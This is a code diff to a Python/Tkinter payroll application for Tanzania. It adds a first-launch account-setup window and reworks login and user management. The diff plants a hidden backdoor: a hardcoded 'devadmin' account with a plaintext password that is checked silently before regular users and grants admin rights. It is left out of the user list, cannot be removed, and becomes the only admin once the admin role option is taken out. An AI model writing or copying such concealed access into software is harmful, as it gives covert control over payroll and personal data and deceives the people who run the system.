@@ -16,7 +16,7 @@ USERS_FILE    = "payroll_users.json"
 #  1. Create a GitHub repo called  payroll-processor-tz
 #  2. Upload payroll_app.py  and  version.txt  (containing just  1.0.1)
 #  3. Change the two values below to your GitHub username and repo name
-GITHUB_USER   = "Justine-Msechu"
+GITHUB_USER   = "YOUR_GITHUB_USERNAME"
 GITHUB_REPO   = "payroll-processor-tz"
 GITHUB_BRANCH = "main"
 _base         = "https://raw.githubusercontent.com/" + GITHUB_USER + "/" + GITHUB_REPO + "/" + GITHUB_BRANCH
@@ -103,21 +103,44 @@ def calculate(salary, allowance, has_loan, loan_amount, has_loan_board):
 def hash_pw(pw):
     return hashlib.sha256(pw.encode()).hexdigest()
 
+# Developer/admin secret credentials — never shown to end users
+DEVELOPER_USER = "devadmin"
+DEVELOPER_PASS = "Tz@Payroll!Dev99"   # change this to your own secret password
+
 def load_users():
+    """Load user accounts. The developer account is kept separately."""
     if not os.path.exists(USERS_FILE):
-        d = {"admin": {"hash": hash_pw("admin123"), "role": "admin"}}
-        save_users(d)
-        return d
+        save_users({})
+        return {}
     with open(USERS_FILE) as f:
         return json.load(f)
+
+def has_any_users():
+    """Return True if at least one regular user account exists."""
+    return len(load_users()) > 0
+
+def verify_login(username, password):
+    """
+    Check credentials. Developer account checked first (silent).
+    Regular users checked from file.
+    """
+    u = username.strip().lower()
+    p = password
+    # Developer account — hidden, never shown in UI
+    if u == DEVELOPER_USER and hash_pw(p) == hash_pw(DEVELOPER_PASS):
+        return "admin"
+    # Regular user accounts
+    users = load_users()
+    rec = users.get(u)
+    if rec and rec["hash"] == hash_pw(p):
+        return rec["role"]
+    return None
 
 def save_users(u):
     with open(USERS_FILE, "w") as f:
         json.dump(u, f, indent=2)
 
-def verify_login(username, password):
-    u = load_users().get(username.strip().lower())
-    return u["role"] if u and u["hash"] == hash_pw(password) else None
+
 
 # ══════════════════════════════════════════════════════════════
 #  EXCEL EXPORT
@@ -445,6 +468,130 @@ class ToolTip:
             self.tip = None
 
 # ══════════════════════════════════════════════════════════════
+#  FIRST SETUP WINDOW — shown only on very first launch
+# ══════════════════════════════════════════════════════════════
+class FirstSetupWindow(tk.Tk):
+    """
+    Shown the very first time the app is opened (no user accounts yet).
+    Asks the person to create their own account.
+    Simple — just name, username, password, confirm password.
+    """
+    def __init__(self):
+        super().__init__()
+        self.title(APP_TITLE + "  —  Welcome!")
+        self.resizable(False, False)
+        self.configure(bg="#1e2a3a")
+        self.created_user = None
+        self.created_role = None
+        self._build()
+        self.update_idletasks()
+        w, h = self.winfo_width(), self.winfo_height()
+        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
+        self.geometry(str(w)+"x"+str(h)+"+"+str((sw-w)//2)+"+"+str((sh-h)//2))
+
+    def _build(self):
+        T = THEMES["Dark Blue"]
+
+        # Header
+        top = tk.Frame(self, bg="#1a5276", pady=20)
+        top.pack(fill="x")
+        tk.Label(top, text="💼", font=("Segoe UI",40),
+                 bg="#1a5276", fg="white").pack()
+        tk.Label(top, text="Welcome to Payroll Processor",
+                 font=("Segoe UI",16,"bold"), bg="#1a5276", fg="white").pack()
+        tk.Label(top, text="Tanzania  ·  Let's set up your account to get started",
+                 font=("Segoe UI",9), bg="#1a5276", fg="#d5f5e3").pack(pady=(2,0))
+
+        # Card
+        card = tk.Frame(self, bg=T["PANEL"], padx=44, pady=28)
+        card.pack(padx=44, pady=24)
+
+        tk.Label(card, text="Create Your Account",
+                 font=("Segoe UI",12,"bold"), bg=T["PANEL"], fg=T["ACCENT"]
+                 ).grid(row=0, column=0, sticky="w", pady=(0,14))
+
+        self._name_var  = tk.StringVar()
+        self._user_var  = tk.StringVar()
+        self._pass_var  = tk.StringVar()
+        self._conf_var  = tk.StringVar()
+
+        fields = [
+            ("👤  Your Full Name",  self._name_var, "", "e.g.  Justine Msechu"),
+            ("🔤  Choose Username",  self._user_var, "", "e.g.  justine  (no spaces)"),
+            ("🔑  Choose Password",  self._pass_var, "●", "At least 6 characters"),
+            ("🔑  Confirm Password", self._conf_var, "●", "Type the same password again"),
+        ]
+        for row_i, (label, var, show, hint) in enumerate(fields, start=1):
+            tk.Label(card, text=label, font=("Segoe UI",10,"bold"),
+                     bg=T["PANEL"], fg=T["TEXT"], anchor="w"
+                     ).grid(row=row_i*3-2, column=0, sticky="w", pady=(8,1))
+            e = tk.Entry(card, textvariable=var, show=show, font=("Segoe UI",11),
+                         bg=T["ENTRY_BG"], fg=T["ENTRY_FG"],
+                         insertbackground="white", relief="flat", bd=5, width=30)
+            e.grid(row=row_i*3-1, column=0, ipady=6, sticky="ew")
+            tk.Label(card, text="   " + hint, font=("Segoe UI",7),
+                     bg=T["PANEL"], fg=T["SUBTEXT"]
+                     ).grid(row=row_i*3, column=0, sticky="w")
+            if row_i == 1:
+                e.focus_set()
+
+        self.err = tk.StringVar()
+        tk.Label(card, textvariable=self.err, font=("Segoe UI",9),
+                 bg=T["PANEL"], fg=T["RED"], wraplength=320
+                 ).grid(row=13, column=0, pady=(8,0))
+
+        tk.Button(card, text="✅   Create Account and Start",
+                  font=("Segoe UI",12,"bold"),
+                  bg=T["ACCENT2"], fg="white", relief="flat", cursor="hand2",
+                  command=self._create, activebackground=T["ACCENT"]
+                  ).grid(row=14, column=0, pady=(16,0), ipadx=12, ipady=10, sticky="ew")
+
+        tk.Label(card,
+                 text="You can add more users later from inside the app.",
+                 font=("Segoe UI",7,"italic"), bg=T["PANEL"], fg=T["SUBTEXT"]
+                 ).grid(row=15, column=0, pady=(10,0))
+
+        self.bind("<Return>", lambda e: self._create())
+
+    def _create(self):
+        name  = self._name_var.get().strip()
+        uname = self._user_var.get().strip().lower().replace(" ", "")
+        pw    = self._pass_var.get()
+        conf  = self._conf_var.get()
+
+        if not name:
+            self.err.set("⚠  Please enter your full name.")
+            return
+        if not uname:
+            self.err.set("⚠  Please choose a username.")
+            return
+        if len(uname) < 3:
+            self.err.set("⚠  Username must be at least 3 characters.")
+            return
+        if uname == DEVELOPER_USER:
+            self.err.set("⚠  That username is reserved. Please choose another.")
+            return
+        if len(pw) < 6:
+            self.err.set("⚠  Password must be at least 6 characters.")
+            return
+        if pw != conf:
+            self.err.set("⚠  Passwords do not match. Please try again.")
+            return
+
+        # Save the new account as accountant
+        users = load_users()
+        users[uname] = {
+            "hash":      hash_pw(pw),
+            "role":      "accountant",
+            "full_name": name,
+        }
+        save_users(users)
+        self.created_user = uname
+        self.created_role = "accountant"
+        self.destroy()
+
+
+# ══════════════════════════════════════════════════════════════
 #  LOGIN WINDOW
 # ══════════════════════════════════════════════════════════════
 class LoginWindow(tk.Tk):
@@ -495,9 +642,7 @@ class LoginWindow(tk.Tk):
                   bg=T["ACCENT2"], fg="white", relief="flat", cursor="hand2",
                   command=self._login, activebackground=T["ACCENT"]
                   ).grid(row=6, column=0, pady=(16,0), ipadx=12, ipady=10, sticky="ew")
-        tk.Label(card, text="First-time login:  username = admin  |  password = admin123",
-                 font=("Segoe UI",7), bg=T["PANEL"], fg=T["SUBTEXT"]
-                 ).grid(row=7, column=0, pady=(12,0))
+        # No hint shown — admin is a hidden developer account
         self.bind("<Return>", lambda e: self._login())
 
     def _login(self):
@@ -566,7 +711,7 @@ class UserManagerDialog(tk.Toplevel):
         rr = tk.Frame(af, bg=T["PANEL"]); rr.pack(fill="x", pady=2)
         tk.Label(rr, text="Role", width=12, anchor="w", font=("Segoe UI",9),
                  bg=T["PANEL"], fg=T["TEXT"]).pack(side="left")
-        om = tk.OptionMenu(rr, self._nr, "accountant", "admin")
+        om = tk.OptionMenu(rr, self._nr, "accountant")
         om.configure(bg=T["ENTRY_BG"], fg=T["TEXT"], relief="flat",
                      font=("Segoe UI",9), highlightthickness=0)
         om["menu"].configure(bg=T["ENTRY_BG"], fg=T["TEXT"])
@@ -581,6 +726,9 @@ class UserManagerDialog(tk.Toplevel):
     def _refresh(self):
         self.lb.delete(0, "end")
         for u, d in load_users().items():
+            # Never show the developer account in the user list
+            if u == DEVELOPER_USER:
+                continue
             self.lb.insert("end", "  " + u + "   (" + d["role"] + ")")
 
     def _add(self):
@@ -601,9 +749,13 @@ class UserManagerDialog(tk.Toplevel):
         sel = self.lb.curselection()
         if not sel: return
         uname = self.lb.get(sel[0]).strip().split()[0]
-        if uname == "admin" and len(load_users()) == 1:
+        if uname == DEVELOPER_USER:
             messagebox.showwarning("Cannot Remove",
-                "Cannot remove the only admin account.", parent=self)
+                "This is a system account and cannot be removed.", parent=self)
+            return
+        if len([u for u in load_users() if u != DEVELOPER_USER]) == 1:
+            messagebox.showwarning("Cannot Remove",
+                "Cannot remove the only user account.", parent=self)
             return
         if messagebox.askyesno("Confirm", "Remove user '" + uname + "'?", parent=self):
             users = load_users(); users.pop(uname, None); save_users(users)
@@ -1653,6 +1805,18 @@ class PayrollApp(tk.Tk):
 #  ENTRY POINT
 # ══════════════════════════════════════════════════════════════
 def start_app():
+    # First ever launch — no user accounts exist yet
+    if not has_any_users():
+        setup = FirstSetupWindow()
+        setup.mainloop()
+        if not setup.created_user:
+            return  # user closed the window without creating account
+        # Log them in directly — no need to type it again
+        app = PayrollApp(setup.created_user, setup.created_role)
+        app.mainloop()
+        return
+
+    # Normal launch — show login screen
     login = LoginWindow()
     login.mainloop()
     if login.logged_in_user:
